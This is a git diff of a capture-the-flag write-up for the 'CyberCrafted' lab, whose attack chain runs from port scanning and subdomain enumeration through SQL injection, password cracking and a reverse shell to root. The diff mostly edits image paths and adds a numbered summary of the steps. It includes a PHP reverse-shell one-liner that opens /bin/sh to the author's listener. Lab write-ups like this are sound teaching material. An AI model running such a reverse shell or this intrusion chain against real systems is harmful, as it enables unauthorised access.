@@ -22,7 +22,7 @@ For port scanning I have used `rustscan` tool. Scanned all 65535 TCP ports and g
 
 ![Rust Scan](/CyberCrafted/images/Rust_Scan.png)
 
-Running a more detailed scan on found open ports with `nmap` reveals their respective versions.
+It identified ports 22, 80 and 25565 as open. Running a more detailed scan on found open ports with `nmap` reveals their respective versions.
 
 ```
 # Nmap 7.92 scan initiated Sat Dec 18 12:31:25 2021 as: nmap -vv -sS -A -p22,80,25565, -oN open_ports.txt 10.10.253.145
@@ -86,47 +86,47 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Going to the webpage using the given IP address redirects to ***cybercrafted.thm*** domain, but fails to open a website.
 
-![Webpage Access Fail](/CyberCraft/images/Webpage_Acces_Fail.png)
+![Webpage Access Fail](/CyberCraftedimages/Webpage_Acces_Fail.png)
 
 Adding the given IP address as cybercrafted.thm to the `/etc/hosts` file and reloading a page fixes the error.
 
-![Hosts File](/CyberCraft/images/Hosts_File.png)
+![Hosts File](/CyberCraftedimages/Hosts_File.png)
 
-![Minecraft Page](/CyberCraft/images/Minecraft_Page.png)
+![Minecraft Page](/CyberCraftedimages/Minecraft_Page.png)
 
 # Directory Enumeration
 
 Using `gobuster` tool and `common.txt` wordlist I was able to find three directories on the Minecraft server.
 
-![Directory Enumeration](/CyberCraft/images/Directory_Enumeration.png)
+![Directory Enumeration](/CyberCraftedimages/Directory_Enumeration.png)
 
 One of found directories reveals three image files.
 
-![Image Files](/CyberCraft/images/Image_Files.png)
+![Image Files](/CyberCraftedimages/Image_Files.png)
 
 # Subdomain Listing
 
 Viewing source code of the index page, there is a note telling that other subdomains are added.
 
-![Index Source](/CyberCraft/images/Index_Source.png)
+![Index Source](/CyberCraftedimages/Index_Source.png)
 
 Using `wfuzz` tool, I found three subdomains for the webpage.
 
-![Subdomains](/CyberCraft/images/Subdomains.png)
+![Subdomains](/CyberCraftedimages/Subdomains.png)
 
 The interesting ones are `admin` and `store`. Main pages on these subdomains were inaccessible, so I added the subdomains to `/etc/hosts` file and searched for `.php` files with gobuster.
 
 Admin subdomain has those files:
 
-![Admin Files](/CyberCraft/images/Admin_Files.png)
+![Admin Files](/CyberCraftedimages/Admin_Files.png)
 
 And these could be found within the store subdomain:
 
-![Store Files](/CyberCraft/images/Store_Files.png)
+![Store Files](/CyberCraftedimages/Store_Files.png)
 
 The store subdomain has a `search.php` file, which in turn shows the search panel:
 
-![Search Store](/CyberCraft/images/Search_Store.png)
+![Search Store](/CyberCraftedimages/Search_Store.png)
 
 # Web Application Exploitation
 
@@ -138,27 +138,27 @@ SQL command:
 
 Found table:
 
-![Admin Table](/CyberCraft/images/Admin_Table.png)
+![Admin Table](/CyberCraftedimages/Admin_Table.png)
 
 The table also has an admin's password hash. Using `john the ripper` with `rockyou.txt` wordlist has allowed me to crack the hash.
 
-![Admin Password](/CyberCraft/images/Admin_Password.png)
+![Admin Password](/CyberCraftedimages/Admin_Password.png)
 
 # Reverse Shell
 
 The `admin` subdomain has an admin login panel.
 
-![Admin Panel](/CyberCraft/images/Admin_Panel.png)
+![Admin Panel](/CyberCraftedimages/Admin_Panel.png)
 
 It is possible to log in using credentials found within the database. Correct credentials grant access to the ***admin panel*** where it is possible to run system commands.
 
-![Admin Commands](/CyberCraft/images/Admin_Commands.png)
+![Admin Commands](/CyberCraftedimages/Admin_Commands.png)
 
 Next I have obtained a PHP reverse shell script from [PayloadsAllTheThings reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
 
 Then I have set up a `netcat` listener on my Kali machine.
 
-![Netcat Listener](/CyberCraft/images/Netcat_Listener.png)
+![Netcat Listener](/CyberCraftedimages/Netcat_Listener.png)
 
 Executing the reverse shell command leads to a captured shell within the listener.
 
@@ -167,7 +167,7 @@ Reverse shell command:
 `php -r '$sock=fsockopen("10.9.9.47",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
 Reverse shell:
-![Reverse Shell](/CyberCraft/images/Reverse_Shell.png)
+![Reverse Shell](/CyberCraftedimages/Reverse_Shell.png)
 
 # SSH Credentials
 
@@ -185,7 +185,7 @@ Now it is possible to ssh into the system.
 
 Heading to `/opt/minecraft` directory, ***minecraft server flag*** is found.
 
-![Minecraft Server Flag](/CyberCraft/images/Minecraft_Server_Flag.png)
+![Minecraft Server Flag](/CyberCraftedimages/Minecraft_Server_Flag.png)
 
 Within the `cybercrafted` subdirectory a sketchy plugin could be found.
 
@@ -223,4 +223,20 @@ Heading to `/root` directory and reading the `root.txt` file gives the root flag
 
 # Conclusion
 
+1. Conducted port scan with Rustscan - found open ports 22, 80 and 25565.
+2. A Minecraft server was running on one of them.
+3. Modifying /etc/hosts file to bind the IP address to cybercrafted.thm allowed to access the webpage.
+4. During directory enumeration I was able to find a couple of directories.
+5. Subdomain enumeration found three subdomains.
+6. Store.cybercrafted.thm was vulnerable to sql injection - I dumped a database with server's admin credentials.
+7. Cracked admin password hash with John the Ripper.
+8. Using these credentials I logged into admin.cybercrafted.thm.
+9. Put a PHP reverse shell on the system command execution field - got a shell access to the system.
+10. Copied admin's private SSH key to my local machine.
+11. Cracked SSH passphrase with John the Ripper.
+12. Logged in to the system as admin.
+13. Found a sketchy plugin in /opt/minecraft.
+14. Within the plugin directory, I found login credentials for the second user.
+15. Exploited the screen utility as the second user to gain the root shell.
 
+Done!
